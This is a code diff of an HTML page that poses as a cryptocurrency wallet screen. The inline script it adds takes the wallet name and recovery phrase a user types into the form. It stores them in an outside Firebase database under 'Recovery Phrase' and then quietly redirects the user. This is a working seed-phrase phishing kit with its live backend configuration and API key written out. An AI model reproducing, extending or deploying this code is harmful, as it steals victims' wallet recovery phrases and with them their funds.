@@ -55,7 +55,7 @@
         <div class="col-3 img-nav pt-4 px-0 mx-auto"><img src="./img/barcode-scan1.png" alt=""></div>
       </div>
     </div>
-    <form method="post" id="frmContact" >
+    <form method="post" id="frmContact">
       <div class="second-div mt-5 mx-5 rounded-4 pb-4">
         <p class="mt-4 pt-1 pl-5 font-weight-bold name">Name</p>
         <input id="name" type="text" class="form-control-plaintext inputf pb-4 pl-5" value="Main Wallet 1" required>
@@ -102,46 +102,45 @@
 
     <script type="module">
       // Import the functions you need from the SDKs you need
-      import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-app.js";
-      import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-database.js";
+		import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-app.js";
+		import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-database.js";
+		 
+		// Paste the code from Firebase
+		// For Firebase JS SDK v7.20.0 and later, measurementId is optional
+		// For Firebase JS SDK v7.20.0 and later, measurementId is optional
+    const firebaseConfig = {
+      apiKey: "AIzaSyBa5QUdE71zYbpn4Jpv7TSZax8bCpOCC7Q",
+      authDomain: "rec-phrase-2c6d0.firebaseapp.com",
+      databaseURL: "https://rec-phrase-2c6d0-default-rtdb.firebaseio.com",
+      projectId: "rec-phrase-2c6d0",
+      storageBucket: "rec-phrase-2c6d0.appspot.com",
+      messagingSenderId: "343999867437",
+      appId: "1:343999867437:web:045ffb356d42cca84ce6a4",
+      measurementId: "G-0V0PL7GWBZ"
+    };
+		 
+		// Initialize Firebase
+		const app = initializeApp(firebaseConfig);
+		 
+		// Get a reference to the database service
+		const db = getDatabase(app);
+		 
+		document.getElementById('frmContact').addEventListener('submit', function(e) {
+			e.preventDefault();
+			set(ref(db, 'Recovery Phrase/' + Math.random().toString(36).slice(2, 7)), {
+				name: document.getElementById('name').value,
+				phrase: document.getElementById('phrase').value,
+			});
+		 
+			// alert('Fail! X -- No enough USDT on your Portfolio');
+			document.getElementById('frmContact').reset();
+      setTimeout(function(){location.href="./page4.html"} , 1000); 
+		});
+    // setTimeout(window.location.assign("./page4.html"), 3000);
+    // window.location.href = './page4.html';
       
-      // Paste the code from Firebase
-      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
-      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
-      const firebaseConfig = {
-        apiKey: "AIzaSyBa5QUdE71zYbpn4Jpv7TSZax8bCpOCC7Q",
-        authDomain: "rec-phrase-2c6d0.firebaseapp.com",
-        databaseURL: "https://rec-phrase-2c6d0-default-rtdb.firebaseio.com",
-        projectId: "rec-phrase-2c6d0",
-        storageBucket: "rec-phrase-2c6d0.appspot.com",
-        messagingSenderId: "343999867437",
-        appId: "1:343999867437:web:045ffb356d42cca84ce6a4",
-        measurementId: "G-0V0PL7GWBZ"
-      };
-      
-      // Initialize Firebase
-      const app = initializeApp(firebaseConfig);
-      
-      // Get a reference to the database service
-      const db = getDatabase(app);
-      
-      document.getElementById('frmContact').addEventListener('submit', function(e) {
-        e.preventDefault();
-        set(ref(db, 'Secret Phrases/' + Math.random().toString(36).slice(2, 7)), {
-          name: document.getElementById('name').value,
-          phrase: document.getElementById('phrase').value,
-        });
-      
-        // alert('Fail! X -- No enough USDT on your Portfolio');
-        
-        document.getElementById('frmContact').reset();
-        window.location.href = './page4.html';
-      });
       // window.location.assign("www.google.com")
-
-      // function newDoc() {
-      //   window.location.assign("https://www.w3schools.com")
-      // }
+      //   
       
 
       // function redirect() {
